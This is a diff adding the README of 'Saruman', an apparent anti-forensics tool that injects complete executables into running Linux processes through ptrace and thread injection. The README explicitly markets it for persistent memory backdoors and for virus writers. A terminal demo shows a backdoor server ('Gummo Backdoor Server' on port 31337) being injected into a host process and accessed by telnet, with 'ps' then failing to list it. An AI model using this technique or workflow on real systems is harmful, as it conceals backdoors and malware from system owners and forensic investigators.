@@ -1,0 +1,106 @@
+Description:
+Saruman is a neat anti-forensics exec() type software, very similar to grugqs remote exec, but also
+very similar to shared library injection. Saruman allows you to run a program inside of an existing
+process. It injects the complete program into a process address space, and injects a thread with SYS_clone
+so that the attackers program can run concurrently with the host process. This allows for things such as
+persistent memory backdoors, and memory viruses that require complex parasite code. For Virus writers
+saruman allows the attacker to author the parasite completely in C, and compiled as a non-static executable
+The only Caveat is that it must be compiled with 'gcc -fpic -fpie', so as a PIE executable. My original
+project for this 'elfdemon' works on injecting regular ET_EXEC executables, and manually relocates them
+which is unreliable for real case scenarios. elfdemon did not use thread injection either; the parasite
+executable would take complete execution over from the host process and pass control back when done.
+Saruman can inject a PIE executable using either __libc_dlopen_mode() which is the more stable method
+or by doing completely manual runtime relocations which is more stealth (Because it doesn't show as
+obvious in /proc/pid/maps). Unfortunately the more stealth method has a bug or two which prevents it
+from working on more complicated parasite programs (Ending in occasional segfaults). Currently Saruman
+does not allow you to pass command line args to your parasite program either; this will require some
+additional coding of setting up the stack and auxillary vector for the new thread in the remote process
+I will add this capability soon.
+
+Example (Injecting a remote shell backdoor into a process)
+
+Terminal 1 
+
+ryan@elfmaster:~/git/saruman$ ./host
+I am the host
+I am the host
+I am the host
+
+Terminal 2
+ryan@elfmaster:~/git/saruman$ ./launcher `pidof host` ./server
+Parasite command: ./server
+[+] Target pid: 5942
+[+] map_elf_binary(ptr, ./server)
+[+] Parasite entry point will be main(): 0xec5
+[+] Found text segment
+[+] Found data segment
+[+] Found dynamic segment
+[+] Found dynamic string table
+[+] Found dynamic symbol table
+[+] Found G.O.T
+[+] PLT count: 720 entries
+[DEBUG]-> get_sym_from_libc() addr of __libc_dl_*: 7f5535015ca0
+[+] PT_ATTACHED -> 5942
+[+] calling bootstrap
+[+] base (or highest address) of stack: 0xa01b000
+[+] calling exec_loader
+[+] dlopen elf exec_loader
+[DEBUG]-> parasite path: ./server
+[DEBUG]-> address of __libc_dlopen_mode(): 0x7f5535015ca0
+DLOPEN_EXEC_LOADER-> ret val: 2407030
+[DEBUG] -> parasite basename: server
+[+] calling launch_parasite()
+[+] Entry point: 0x7f5534cdcec5
+[+] Thread injection succeeded, tid: 5948
+[+] Saruman successfully injected program: ./server
+[+] PT_DETACHED -> 5942
+
+Terminal 1 
+ryan@elfmaster:~/git/saruman$ ./host
+I am the host
+I am the host
+I am the host
+I am the host
+I am the host
+
+Terminal 2 
+ryan@elfmaster:~/git/saruman$ telnet localhost 31337
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+Password: password
+Access Granted, HEH
+
+
+Welcome To Gummo Backdoor Server!
+
+Type 'HELP' for a list of commands
+
+command:~#
+
+
+Terminal 1
+ryan@elfmaster:~/git/saruman$ ./host
+I am the host
+I am the host
+I am the host
+I am the host
+I am the host
+I am the host
+I am the host
+I am the host
+I am the host
+
+Terminal 3
+ryan@elfmaster:~/git/saruman$ ps auxw | grep server | grep -v grep
+ryan@elfmaster:~/git/saruman$
+
+As shown above we execute a backdoor program called './server' inside existing process './host'
+
+SARUMAN NOTES:
+
+You can run as many programs in a single process address space as you want. I was able
+to get 3 additional executables all running in the same process (I did not test more
+It is worth noting that there appears to be a bug (Which I will fix) where the executable
+program you are injecting, must have a filename that is a multiple of 4 bytes
+
